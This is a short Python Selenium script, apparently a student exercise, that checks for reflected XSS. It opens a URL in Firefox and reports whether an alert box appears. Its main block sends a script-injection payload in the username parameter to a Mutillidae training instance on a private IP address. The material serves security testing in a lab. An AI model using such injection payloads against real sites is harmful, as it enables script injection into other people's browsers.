"""
Kod którym posiłkowano się:
https://stackoverflow.com/questions/19003003/check-if-any-alert-exists-using-selenium-with-python


"""
from selenium.common.exceptions import UnexpectedAlertPresentException
from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException
from selenium.webdriver.firefox.firefox_binary import FirefoxBinary

def test_xss_get(url):
    

    binary = FirefoxBinary(r'C:\Program Files (x86)\Mozilla Firefox\firefox.exe')
    browser = webdriver.Firefox(firefox_binary=binary)
    browser.get(url)

    try:
        try:
            WebDriverWait(browser, 3).until(EC.alert_is_present(),
                                    'Timed out waiting for PA creation ' +
                                    'confirmation popup to appear.')
            alert = browser.switch_to.alert
            print(alert.text)
            alert.accept()
            browser.close()
            return True
        except UnexpectedAlertPresentException as e:
            print(e)
            browser.close()
            return True

        
    except TimeoutException:
        browser.close()
        return False



def test_xss_post(url, data):
    binary = FirefoxBinary(r'C:\Program Files (x86)\Mozilla Firefox\firefox.exe')
    browser = webdriver.Firefox(firefox_binary=binary)
    browser.get(url)

    try:
        WebDriverWait(browser, 3).until(EC.alert_is_present(),
                                    'Timed out waiting for PA creation ' +
                                    'confirmation popup to appear.')

        alert = browser.switch_to.alert
        alert.accept()
        return True
    except TimeoutException:
        return False

if __name__=="__main__":
    is_xss = test_xss_get("http://192.168.198.128/mutillidae/index.php?page=password-generator.php&username=%22;alert(1);a=%22")
    print("XSS ", is_xss)